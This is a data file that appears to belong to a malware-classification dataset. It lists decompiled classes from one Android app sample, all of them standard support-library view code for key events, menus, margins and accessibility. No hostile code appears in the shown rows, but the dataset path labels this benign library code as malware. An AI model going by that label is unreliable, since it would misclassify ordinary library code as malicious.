"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\HoneycombKeyEventVersionImpl.code","static class HoneycombKeyEventVersionImpl extends EclairKeyEventVersionImpl {   HoneycombKeyEventVersionImpl(){   }   @Override public int normalizeMetaState(  int metaState){     return KeyEventCompatHoneycomb.normalizeMetaState(metaState);   }   @Override public boolean metaStateHasModifiers(  int metaState,  int modifiers){     return KeyEventCompatHoneycomb.metaStateHasModifiers(metaState,modifiers);   }   @Override public boolean metaStateHasNoModifiers(  int metaState){     return KeyEventCompatHoneycomb.metaStateHasNoModifiers(metaState);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\HoneycombMenuVersionImpl.code","static class HoneycombMenuVersionImpl implements MenuVersionImpl {   HoneycombMenuVersionImpl(){   }   @Override public void setShowAsAction(  MenuItem item,  int actionEnum){     MenuItemCompatHoneycomb.setShowAsAction(item,actionEnum);   }   @Override public MenuItem setActionView(  MenuItem item,  View view){     return MenuItemCompatHoneycomb.setActionView(item,view);   }   @Override public MenuItem setActionView(  MenuItem item,  int resId){     return MenuItemCompatHoneycomb.setActionView(item,resId);   }   @Override public View getActionView(  MenuItem item){     return MenuItemCompatHoneycomb.getActionView(item);   }   @Override public boolean expandActionView(  MenuItem item){     return false;   }   @Override public boolean collapseActionView(  MenuItem item){     return false;   }   @Override public boolean isActionViewExpanded(  MenuItem item){     return false;   }   @Override public MenuItem setOnActionExpandListener(  MenuItem item,  OnActionExpandListener listener){     return item;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\HoneycombVelocityTrackerVersionImpl.code","static class HoneycombVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {   HoneycombVelocityTrackerVersionImpl(){   }   @Override public float getXVelocity(  VelocityTracker tracker,  int pointerId){     return VelocityTrackerCompatHoneycomb.getXVelocity(tracker,pointerId);   }   @Override public float getYVelocity(  VelocityTracker tracker,  int pointerId){     return VelocityTrackerCompatHoneycomb.getYVelocity(tracker,pointerId);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\IcsMenuVersionImpl.code","static class IcsMenuVersionImpl extends HoneycombMenuVersionImpl {   IcsMenuVersionImpl(){   }   @Override public boolean expandActionView(  MenuItem item){     return MenuItemCompatIcs.expandActionView(item);   }   @Override public boolean collapseActionView(  MenuItem item){     return MenuItemCompatIcs.collapseActionView(item);   }   @Override public boolean isActionViewExpanded(  MenuItem item){     return MenuItemCompatIcs.isActionViewExpanded(item);   }   @Override public MenuItem setOnActionExpandListener(  MenuItem item,  final OnActionExpandListener listener){     return listener == null ? MenuItemCompatIcs.setOnActionExpandListener(item,null) : MenuItemCompatIcs.setOnActionExpandListener(item,new MenuItemCompatIcs.SupportActionExpandProxy(){       @Override public boolean onMenuItemActionExpand(      MenuItem item2){         return listener.onMenuItemActionExpand(item2);       }       @Override public boolean onMenuItemActionCollapse(      MenuItem item2){         return listener.onMenuItemActionCollapse(item2);       }     } );   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ICSViewCompatImpl.code","static class ICSViewCompatImpl extends HCViewCompatImpl {   ICSViewCompatImpl(){   }   @Override public boolean canScrollHorizontally(  View v,  int direction){     return ViewCompatICS.canScrollHorizontally(v,direction);   }   @Override public boolean canScrollVertically(  View v,  int direction){     return ViewCompatICS.canScrollVertically(v,direction);   }   @Override public void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){     ViewCompatICS.onPopulateAccessibilityEvent(v,event);   }   @Override public void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){     ViewCompatICS.onInitializeAccessibilityEvent(v,event);   }   @Override public void onInitializeAccessibilityNodeInfo(  View v,  AccessibilityNodeInfoCompat info){     ViewCompatICS.onInitializeAccessibilityNodeInfo(v,info.getInfo());   }   @Override public void setAccessibilityDelegate(  View v,  AccessibilityDelegateCompat delegate){     ViewCompatICS.setAccessibilityDelegate(v,delegate.getBridge());   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ItemInfo.code","public static class ItemInfo {   Object object;   float offset;   int position;   boolean scrolling;   float widthFactor;   ItemInfo(){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\JbMr1ViewCompatImpl.code","static class JbMr1ViewCompatImpl extends JBViewCompatImpl {   JbMr1ViewCompatImpl(){   }   @Override public int getLabelFor(  View view){     return ViewCompatJellybeanMr1.getLabelFor(view);   }   @Override public void setLabelFor(  View view,  int id){     ViewCompatJellybeanMr1.setLabelFor(view,id);   }   @Override public void setLayerPaint(  View view,  Paint paint){     ViewCompatJellybeanMr1.setLayerPaint(view,paint);   }   @Override public int getLayoutDirection(  View view){     return ViewCompatJellybeanMr1.getLayoutDirection(view);   }   @Override public void setLayoutDirection(  View view,  int layoutDirection){     ViewCompatJellybeanMr1.setLayoutDirection(view,layoutDirection);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\JBViewCompatImpl.code","static class JBViewCompatImpl extends ICSViewCompatImpl {   JBViewCompatImpl(){   }   @Override public boolean hasTransientState(  View view){     return ViewCompatJB.hasTransientState(view);   }   @Override public void setHasTransientState(  View view,  boolean hasTransientState){     ViewCompatJB.setHasTransientState(view,hasTransientState);   }   @Override public void postInvalidateOnAnimation(  View view){     ViewCompatJB.postInvalidateOnAnimation(view);   }   @Override public void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     ViewCompatJB.postInvalidateOnAnimation(view,left,top,right,bottom);   }   @Override public void postOnAnimation(  View view,  Runnable action){     ViewCompatJB.postOnAnimation(view,action);   }   @Override public void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     ViewCompatJB.postOnAnimationDelayed(view,action,delayMillis);   }   @Override public int getImportantForAccessibility(  View view){     return ViewCompatJB.getImportantForAccessibility(view);   }   @Override public void setImportantForAccessibility(  View view,  int mode){     ViewCompatJB.setImportantForAccessibility(view,mode);   }   @Override public boolean performAccessibilityAction(  View view,  int action,  Bundle arguments){     return ViewCompatJB.performAccessibilityAction(view,action,arguments);   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     Object compat=ViewCompatJB.getAccessibilityNodeProvider(view);     if (compat != null) {       return new AccessibilityNodeProviderCompat(compat);     }     return null;   }   @Override public ViewParent getParentForAccessibility(  View view){     return ViewCompatJB.getParentForAccessibility(view);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\KeyEventCompat.code","public class KeyEventCompat {   static final KeyEventVersionImpl IMPL; interface KeyEventVersionImpl {     boolean dispatch(    KeyEvent keyEvent,    KeyEvent.Callback callback,    Object obj,    Object obj2);     Object getKeyDispatcherState(    View view);     boolean isTracking(    KeyEvent keyEvent);     boolean metaStateHasModifiers(    int i,    int i2);     boolean metaStateHasNoModifiers(    int i);     int normalizeMetaState(    int i);     void startTracking(    KeyEvent keyEvent);   } static class BaseKeyEventVersionImpl implements KeyEventVersionImpl {     private static final int META_ALL_MASK=247;     private static final int META_MODIFIER_MASK=247;     BaseKeyEventVersionImpl(){     }     private static int metaStateFilterDirectionalModifiers(    int metaState,    int modifiers,    int basic,    int left,    int right){       boolean wantBasic=(modifiers & basic) != 0;       int directional=left | right;       boolean wantLeftOrRight=(modifiers & directional) != 0;       if (wantBasic) {         if (wantLeftOrRight) {           throw new IllegalArgumentException(""bad arguments"");         }         return metaState & (directional ^ (-1));       }       if (wantLeftOrRight) {         return metaState & (basic ^ (-1));       }       return metaState;     }     @Override public int normalizeMetaState(    int metaState){       if ((metaState & 192) != 0) {         metaState|=1;       }       if ((metaState & 48) != 0) {         metaState|=2;       }       return metaState & 247;     }     @Override public boolean metaStateHasModifiers(    int metaState,    int modifiers){       return metaStateFilterDirectionalModifiers(metaStateFilterDirectionalModifiers(normalizeMetaState(metaState) & 247,modifiers,1,64,128),modifiers,2,16,32) == modifiers;     }     @Override public boolean metaStateHasNoModifiers(    int metaState){       return (normalizeMetaState(metaState) & 247) == 0;     }     @Override public void startTracking(    KeyEvent event){     }     @Override public boolean isTracking(    KeyEvent event){       return false;     }     @Override public Object getKeyDispatcherState(    View view){       return null;     }     @Override public boolean dispatch(    KeyEvent event,    KeyEvent.Callback receiver,    Object state,    Object target){       return event.dispatch(receiver);     }   } static class EclairKeyEventVersionImpl extends BaseKeyEventVersionImpl {     EclairKeyEventVersionImpl(){     }     @Override public void startTracking(    KeyEvent event){       KeyEventCompatEclair.startTracking(event);     }     @Override public boolean isTracking(    KeyEvent event){       return KeyEventCompatEclair.isTracking(event);     }     @Override public Object getKeyDispatcherState(    View view){       return KeyEventCompatEclair.getKeyDispatcherState(view);     }     @Override public boolean dispatch(    KeyEvent event,    KeyEvent.Callback receiver,    Object state,    Object target){       return KeyEventCompatEclair.dispatch(event,receiver,state,target);     }   } static class HoneycombKeyEventVersionImpl extends EclairKeyEventVersionImpl {     HoneycombKeyEventVersionImpl(){     }     @Override public int normalizeMetaState(    int metaState){       return KeyEventCompatHoneycomb.normalizeMetaState(metaState);     }     @Override public boolean metaStateHasModifiers(    int metaState,    int modifiers){       return KeyEventCompatHoneycomb.metaStateHasModifiers(metaState,modifiers);     }     @Override public boolean metaStateHasNoModifiers(    int metaState){       return KeyEventCompatHoneycomb.metaStateHasNoModifiers(metaState);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new HoneycombKeyEventVersionImpl();     }  else {       IMPL=new BaseKeyEventVersionImpl();     }   }   public static int normalizeMetaState(  int metaState){     return IMPL.normalizeMetaState(metaState);   }   public static boolean metaStateHasModifiers(  int metaState,  int modifiers){     return IMPL.metaStateHasModifiers(metaState,modifiers);   }   public static boolean metaStateHasNoModifiers(  int metaState){     return IMPL.metaStateHasNoModifiers(metaState);   }   public static boolean hasModifiers(  KeyEvent event,  int modifiers){     return IMPL.metaStateHasModifiers(event.getMetaState(),modifiers);   }   public static boolean hasNoModifiers(  KeyEvent event){     return IMPL.metaStateHasNoModifiers(event.getMetaState());   }   public static void startTracking(  KeyEvent event){     IMPL.startTracking(event);   }   public static boolean isTracking(  KeyEvent event){     return IMPL.isTracking(event);   }   public static Object getKeyDispatcherState(  View view){     return IMPL.getKeyDispatcherState(view);   }   public static boolean dispatch(  KeyEvent event,  KeyEvent.Callback receiver,  Object state,  Object target){     return IMPL.dispatch(event,receiver,state,target);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\KeyEventCompatEclair.code","class KeyEventCompatEclair {   KeyEventCompatEclair(){   }   public static Object getKeyDispatcherState(  View view){     return view.getKeyDispatcherState();   }   public static boolean dispatch(  KeyEvent event,  KeyEvent.Callback receiver,  Object state,  Object target){     return event.dispatch(receiver,(KeyEvent.DispatcherState)state,target);   }   public static void startTracking(  KeyEvent event){     event.startTracking();   }   public static boolean isTracking(  KeyEvent event){     return event.isTracking();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\KeyEventCompatHoneycomb.code","class KeyEventCompatHoneycomb {   KeyEventCompatHoneycomb(){   }   public static int normalizeMetaState(  int metaState){     return KeyEvent.normalizeMetaState(metaState);   }   public static boolean metaStateHasModifiers(  int metaState,  int modifiers){     return KeyEvent.metaStateHasModifiers(metaState,modifiers);   }   public static boolean metaStateHasNoModifiers(  int metaState){     return KeyEvent.metaStateHasNoModifiers(metaState);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\KeyEventVersionImpl.code","interface KeyEventVersionImpl {   boolean dispatch(  KeyEvent keyEvent,  KeyEvent.Callback callback,  Object obj,  Object obj2);   Object getKeyDispatcherState(  View view);   boolean isTracking(  KeyEvent keyEvent);   boolean metaStateHasModifiers(  int i,  int i2);   boolean metaStateHasNoModifiers(  int i);   int normalizeMetaState(  int i);   void startTracking(  KeyEvent keyEvent); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\KitKatViewCompatImpl.code","static class KitKatViewCompatImpl extends JbMr1ViewCompatImpl {   KitKatViewCompatImpl(){   }   @Override public int getAccessibilityLiveRegion(  View view){     return ViewCompatKitKat.getAccessibilityLiveRegion(view);   }   @Override public void setAccessibilityLiveRegion(  View view,  int mode){     ViewCompatKitKat.setAccessibilityLiveRegion(view,mode);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\LayoutParams.code","public static class LayoutParams extends ViewGroup.LayoutParams {   int childIndex;   public int gravity;   public boolean isDecor;   boolean needsMeasure;   int position;   float widthFactor;   public LayoutParams(){     super(-1,-1);     this.widthFactor=0.0f;   }   public LayoutParams(  Context context,  AttributeSet attrs){     super(context,attrs);     this.widthFactor=0.0f;     TypedArray a2=context.obtainStyledAttributes(attrs,ViewPager.LAYOUT_ATTRS);     this.gravity=a2.getInteger(0,48);     a2.recycle();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\MarginLayoutParamsCompat.code","public class MarginLayoutParamsCompat {   static final MarginLayoutParamsCompatImpl IMPL; interface MarginLayoutParamsCompatImpl {     int getLayoutDirection(    ViewGroup.MarginLayoutParams marginLayoutParams);     int getMarginEnd(    ViewGroup.MarginLayoutParams marginLayoutParams);     int getMarginStart(    ViewGroup.MarginLayoutParams marginLayoutParams);     boolean isMarginRelative(    ViewGroup.MarginLayoutParams marginLayoutParams);     void resolveLayoutDirection(    ViewGroup.MarginLayoutParams marginLayoutParams,    int i);     void setLayoutDirection(    ViewGroup.MarginLayoutParams marginLayoutParams,    int i);     void setMarginEnd(    ViewGroup.MarginLayoutParams marginLayoutParams,    int i);     void setMarginStart(    ViewGroup.MarginLayoutParams marginLayoutParams,    int i);   } static class MarginLayoutParamsCompatImplBase implements MarginLayoutParamsCompatImpl {     MarginLayoutParamsCompatImplBase(){     }     @Override public int getMarginStart(    ViewGroup.MarginLayoutParams lp){       return lp.leftMargin;     }     @Override public int getMarginEnd(    ViewGroup.MarginLayoutParams lp){       return lp.rightMargin;     }     @Override public void setMarginStart(    ViewGroup.MarginLayoutParams lp,    int marginStart){       lp.leftMargin=marginStart;     }     @Override public void setMarginEnd(    ViewGroup.MarginLayoutParams lp,    int marginEnd){       lp.rightMargin=marginEnd;     }     @Override public boolean isMarginRelative(    ViewGroup.MarginLayoutParams lp){       return false;     }     @Override public int getLayoutDirection(    ViewGroup.MarginLayoutParams lp){       return 0;     }     @Override public void setLayoutDirection(    ViewGroup.MarginLayoutParams lp,    int layoutDirection){     }     @Override public void resolveLayoutDirection(    ViewGroup.MarginLayoutParams lp,    int layoutDirection){     }   } static class MarginLayoutParamsCompatImplJbMr1 implements MarginLayoutParamsCompatImpl {     MarginLayoutParamsCompatImplJbMr1(){     }     @Override public int getMarginStart(    ViewGroup.MarginLayoutParams lp){       return MarginLayoutParamsCompatJellybeanMr1.getMarginStart(lp);     }     @Override public int getMarginEnd(    ViewGroup.MarginLayoutParams lp){       return MarginLayoutParamsCompatJellybeanMr1.getMarginEnd(lp);     }     @Override public void setMarginStart(    ViewGroup.MarginLayoutParams lp,    int marginStart){       MarginLayoutParamsCompatJellybeanMr1.setMarginStart(lp,marginStart);     }     @Override public void setMarginEnd(    ViewGroup.MarginLayoutParams lp,    int marginEnd){       MarginLayoutParamsCompatJellybeanMr1.setMarginEnd(lp,marginEnd);     }     @Override public boolean isMarginRelative(    ViewGroup.MarginLayoutParams lp){       return MarginLayoutParamsCompatJellybeanMr1.isMarginRelative(lp);     }     @Override public int getLayoutDirection(    ViewGroup.MarginLayoutParams lp){       return MarginLayoutParamsCompatJellybeanMr1.getLayoutDirection(lp);     }     @Override public void setLayoutDirection(    ViewGroup.MarginLayoutParams lp,    int layoutDirection){       MarginLayoutParamsCompatJellybeanMr1.setLayoutDirection(lp,layoutDirection);     }     @Override public void resolveLayoutDirection(    ViewGroup.MarginLayoutParams lp,    int layoutDirection){       MarginLayoutParamsCompatJellybeanMr1.resolveLayoutDirection(lp,layoutDirection);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 17) {       IMPL=new MarginLayoutParamsCompatImplJbMr1();     }  else {       IMPL=new MarginLayoutParamsCompatImplBase();     }   }   public static int getMarginStart(  ViewGroup.MarginLayoutParams lp){     return IMPL.getMarginStart(lp);   }   public static int getMarginEnd(  ViewGroup.MarginLayoutParams lp){     return IMPL.getMarginEnd(lp);   }   public static void setMarginStart(  ViewGroup.MarginLayoutParams lp,  int marginStart){     IMPL.setMarginStart(lp,marginStart);   }   public static void setMarginEnd(  ViewGroup.MarginLayoutParams lp,  int marginEnd){     IMPL.setMarginEnd(lp,marginEnd);   }   public static boolean isMarginRelative(  ViewGroup.MarginLayoutParams lp){     return IMPL.isMarginRelative(lp);   }   public static int getLayoutDirection(  ViewGroup.MarginLayoutParams lp){     return IMPL.getLayoutDirection(lp);   }   public static void setLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){     IMPL.setLayoutDirection(lp,layoutDirection);   }   public static void resolveLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){     IMPL.resolveLayoutDirection(lp,layoutDirection);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\MarginLayoutParamsCompatImpl.code","interface MarginLayoutParamsCompatImpl {   int getLayoutDirection(  ViewGroup.MarginLayoutParams marginLayoutParams);   int getMarginEnd(  ViewGroup.MarginLayoutParams marginLayoutParams);   int getMarginStart(  ViewGroup.MarginLayoutParams marginLayoutParams);   boolean isMarginRelative(  ViewGroup.MarginLayoutParams marginLayoutParams);   void resolveLayoutDirection(  ViewGroup.MarginLayoutParams marginLayoutParams,  int i);   void setLayoutDirection(  ViewGroup.MarginLayoutParams marginLayoutParams,  int i);   void setMarginEnd(  ViewGroup.MarginLayoutParams marginLayoutParams,  int i);   void setMarginStart(  ViewGroup.MarginLayoutParams marginLayoutParams,  int i); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\MarginLayoutParamsCompatImplBase.code","static class MarginLayoutParamsCompatImplBase implements MarginLayoutParamsCompatImpl {   MarginLayoutParamsCompatImplBase(){   }   @Override public int getMarginStart(  ViewGroup.MarginLayoutParams lp){     return lp.leftMargin;   }   @Override public int getMarginEnd(  ViewGroup.MarginLayoutParams lp){     return lp.rightMargin;   }   @Override public void setMarginStart(  ViewGroup.MarginLayoutParams lp,  int marginStart){     lp.leftMargin=marginStart;   }   @Override public void setMarginEnd(  ViewGroup.MarginLayoutParams lp,  int marginEnd){     lp.rightMargin=marginEnd;   }   @Override public boolean isMarginRelative(  ViewGroup.MarginLayoutParams lp){     return false;   }   @Override public int getLayoutDirection(  ViewGroup.MarginLayoutParams lp){     return 0;   }   @Override public void setLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){   }   @Override public void resolveLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\MarginLayoutParamsCompatImplJbMr1.code","static class MarginLayoutParamsCompatImplJbMr1 implements MarginLayoutParamsCompatImpl {   MarginLayoutParamsCompatImplJbMr1(){   }   @Override public int getMarginStart(  ViewGroup.MarginLayoutParams lp){     return MarginLayoutParamsCompatJellybeanMr1.getMarginStart(lp);   }   @Override public int getMarginEnd(  ViewGroup.MarginLayoutParams lp){     return MarginLayoutParamsCompatJellybeanMr1.getMarginEnd(lp);   }   @Override public void setMarginStart(  ViewGroup.MarginLayoutParams lp,  int marginStart){     MarginLayoutParamsCompatJellybeanMr1.setMarginStart(lp,marginStart);   }   @Override public void setMarginEnd(  ViewGroup.MarginLayoutParams lp,  int marginEnd){     MarginLayoutParamsCompatJellybeanMr1.setMarginEnd(lp,marginEnd);   }   @Override public boolean isMarginRelative(  ViewGroup.MarginLayoutParams lp){     return MarginLayoutParamsCompatJellybeanMr1.isMarginRelative(lp);   }   @Override public int getLayoutDirection(  ViewGroup.MarginLayoutParams lp){     return MarginLayoutParamsCompatJellybeanMr1.getLayoutDirection(lp);   }   @Override public void setLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){     MarginLayoutParamsCompatJellybeanMr1.setLayoutDirection(lp,layoutDirection);   }   @Override public void resolveLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){     MarginLayoutParamsCompatJellybeanMr1.resolveLayoutDirection(lp,layoutDirection);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\MarginLayoutParamsCompatJellybeanMr1.code","class MarginLayoutParamsCompatJellybeanMr1 {   MarginLayoutParamsCompatJellybeanMr1(){   }   public static int getMarginStart(  ViewGroup.MarginLayoutParams lp){     return lp.getMarginStart();   }   public static int getMarginEnd(  ViewGroup.MarginLayoutParams lp){     return lp.getMarginEnd();   }   public static void setMarginStart(  ViewGroup.MarginLayoutParams lp,  int marginStart){     lp.setMarginStart(marginStart);   }   public static void setMarginEnd(  ViewGroup.MarginLayoutParams lp,  int marginEnd){     lp.setMarginEnd(marginEnd);   }   public static boolean isMarginRelative(  ViewGroup.MarginLayoutParams lp){     return lp.isMarginRelative();   }   public static int getLayoutDirection(  ViewGroup.MarginLayoutParams lp){     return lp.getLayoutDirection();   }   public static void setLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){     lp.setLayoutDirection(layoutDirection);   }   public static void resolveLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){     lp.resolveLayoutDirection(layoutDirection);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\MenuCompat.code","public class MenuCompat {   @Deprecated public static void setShowAsAction(  MenuItem item,  int actionEnum){     MenuItemCompat.setShowAsAction(item,actionEnum);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\MenuItemCompat.code","public class MenuItemCompat {   static final MenuVersionImpl IMPL;   public static final int SHOW_AS_ACTION_ALWAYS=2;   public static final int SHOW_AS_ACTION_COLLAPSE_ACTION_VIEW=8;   public static final int SHOW_AS_ACTION_IF_ROOM=1;   public static final int SHOW_AS_ACTION_NEVER=0;   public static final int SHOW_AS_ACTION_WITH_TEXT=4;   private static final String TAG=""MenuItemCompat""; interface MenuVersionImpl {     boolean collapseActionView(    MenuItem menuItem);     boolean expandActionView(    MenuItem menuItem);     View getActionView(    MenuItem menuItem);     boolean isActionViewExpanded(    MenuItem menuItem);     MenuItem setActionView(    MenuItem menuItem,    int i);     MenuItem setActionView(    MenuItem menuItem,    View view);     MenuItem setOnActionExpandListener(    MenuItem menuItem,    OnActionExpandListener onActionExpandListener);     void setShowAsAction(    MenuItem menuItem,    int i);   } public interface OnActionExpandListener {     boolean onMenuItemActionCollapse(    MenuItem menuItem);     boolean onMenuItemActionExpand(    MenuItem menuItem);   } static class BaseMenuVersionImpl implements MenuVersionImpl {     BaseMenuVersionImpl(){     }     @Override public void setShowAsAction(    MenuItem item,    int actionEnum){     }     @Override public MenuItem setActionView(    MenuItem item,    View view){       return item;     }     @Override public MenuItem setActionView(    MenuItem item,    int resId){       return item;     }     @Override public View getActionView(    MenuItem item){       return null;     }     @Override public boolean expandActionView(    MenuItem item){       return false;     }     @Override public boolean collapseActionView(    MenuItem item){       return false;     }     @Override public boolean isActionViewExpanded(    MenuItem item){       return false;     }     @Override public MenuItem setOnActionExpandListener(    MenuItem item,    OnActionExpandListener listener){       return item;     }   } static class HoneycombMenuVersionImpl implements MenuVersionImpl {     HoneycombMenuVersionImpl(){     }     @Override public void setShowAsAction(    MenuItem item,    int actionEnum){       MenuItemCompatHoneycomb.setShowAsAction(item,actionEnum);     }     @Override public MenuItem setActionView(    MenuItem item,    View view){       return MenuItemCompatHoneycomb.setActionView(item,view);     }     @Override public MenuItem setActionView(    MenuItem item,    int resId){       return MenuItemCompatHoneycomb.setActionView(item,resId);     }     @Override public View getActionView(    MenuItem item){       return MenuItemCompatHoneycomb.getActionView(item);     }     @Override public boolean expandActionView(    MenuItem item){       return false;     }     @Override public boolean collapseActionView(    MenuItem item){       return false;     }     @Override public boolean isActionViewExpanded(    MenuItem item){       return false;     }     @Override public MenuItem setOnActionExpandListener(    MenuItem item,    OnActionExpandListener listener){       return item;     }   } static class IcsMenuVersionImpl extends HoneycombMenuVersionImpl {     IcsMenuVersionImpl(){     }     @Override public boolean expandActionView(    MenuItem item){       return MenuItemCompatIcs.expandActionView(item);     }     @Override public boolean collapseActionView(    MenuItem item){       return MenuItemCompatIcs.collapseActionView(item);     }     @Override public boolean isActionViewExpanded(    MenuItem item){       return MenuItemCompatIcs.isActionViewExpanded(item);     }     @Override public MenuItem setOnActionExpandListener(    MenuItem item,    final OnActionExpandListener listener){       return listener == null ? MenuItemCompatIcs.setOnActionExpandListener(item,null) : MenuItemCompatIcs.setOnActionExpandListener(item,new MenuItemCompatIcs.SupportActionExpandProxy(){         @Override public boolean onMenuItemActionExpand(        MenuItem item2){           return listener.onMenuItemActionExpand(item2);         }         @Override public boolean onMenuItemActionCollapse(        MenuItem item2){           return listener.onMenuItemActionCollapse(item2);         }       } );     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 14) {       IMPL=new IcsMenuVersionImpl();     }  else     if (version >= 11) {       IMPL=new HoneycombMenuVersionImpl();     }  else {       IMPL=new BaseMenuVersionImpl();     }   }   public static void setShowAsAction(  MenuItem item,  int actionEnum){     if (item instanceof SupportMenuItem) {       ((SupportMenuItem)item).setShowAsAction(actionEnum);     }  else {       IMPL.setShowAsAction(item,actionEnum);     }   }   public static MenuItem setActionView(  MenuItem item,  View view){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).setActionView(view) : IMPL.setActionView(item,view);   }   public static MenuItem setActionView(  MenuItem item,  int resId){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).setActionView(resId) : IMPL.setActionView(item,resId);   }   public static View getActionView(  MenuItem item){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).getActionView() : IMPL.getActionView(item);   }   public static MenuItem setActionProvider(  MenuItem item,  ActionProvider provider){     if (item instanceof SupportMenuItem) {       return ((SupportMenuItem)item).setSupportActionProvider(provider);     }     Log.w(TAG,""setActionProvider: item does not implement SupportMenuItem; ignoring"");     return item;   }   public static ActionProvider getActionProvider(  MenuItem item){     if (item instanceof SupportMenuItem) {       return ((SupportMenuItem)item).getSupportActionProvider();     }     Log.w(TAG,""getActionProvider: item does not implement SupportMenuItem; returning null"");     return null;   }   public static boolean expandActionView(  MenuItem item){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).expandActionView() : IMPL.expandActionView(item);   }   public static boolean collapseActionView(  MenuItem item){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).collapseActionView() : IMPL.collapseActionView(item);   }   public static boolean isActionViewExpanded(  MenuItem item){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).isActionViewExpanded() : IMPL.isActionViewExpanded(item);   }   public static MenuItem setOnActionExpandListener(  MenuItem item,  OnActionExpandListener listener){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).setSupportOnActionExpandListener(listener) : IMPL.setOnActionExpandListener(item,listener);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\MenuItemCompatHoneycomb.code","class MenuItemCompatHoneycomb {   MenuItemCompatHoneycomb(){   }   public static void setShowAsAction(  MenuItem item,  int actionEnum){     item.setShowAsAction(actionEnum);   }   public static MenuItem setActionView(  MenuItem item,  View view){     return item.setActionView(view);   }   public static MenuItem setActionView(  MenuItem item,  int resId){     return item.setActionView(resId);   }   public static View getActionView(  MenuItem item){     return item.getActionView();   } } "
